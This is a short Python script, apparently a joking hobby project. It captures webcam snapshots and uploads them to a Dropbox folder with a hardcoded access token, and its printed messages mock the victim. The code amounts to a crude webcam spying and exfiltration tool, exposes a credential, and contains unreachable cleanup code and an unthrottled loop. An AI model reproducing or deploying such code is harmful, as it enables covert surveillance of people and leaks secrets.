import cv2
import dropbox
import time
import random

# Return the time in seconds
start_time = time.time()

# Take snapshots
def winkSubtly():
    number = random.randint(0, 100)
    videoCaptureObject = cv2.VideoCapture(0)
    result = True
    
    while(result):
       ret, frame = videoCaptureObject.read()
       img_name = "img"+str(number)+".png"
       cv2.imwrite(img_name, frame)
       result = False
    
    return img_name
    print("Hello! Just ignore the little white light up there which says that your camera is on!")
    videoCaptureObject.release()
    cv2.destroyAllWindows()
    
def uploadSadImages(img_name):
    access_token = "m7NFzhrc15cAAAAAAAAAAY80haeWykgB2EEOhgYHlr0hYJKVm9vfcE5ZJWAGRDW6"
    file = img_name
    file_from = file 
    file_to = "/Totally-Not-Personal-Pictures/"+(img_name)
    dbx = dropbox.Dropbox(access_token)
    with open(file_from,'rb') as f:
        dbx.files_upload(f.read(), file_to, mode = dropbox.files.WriteMode.overwrite)
        print("Hello! I have totally not uploaded your picture to the cloud, where it can totally not be accessed by millions of people worldwide!")

def main():
    while(True):
        if((time.time() - start_time) >= 10):
            name = winkSubtly()
            uploadSadImages(name)
            
main()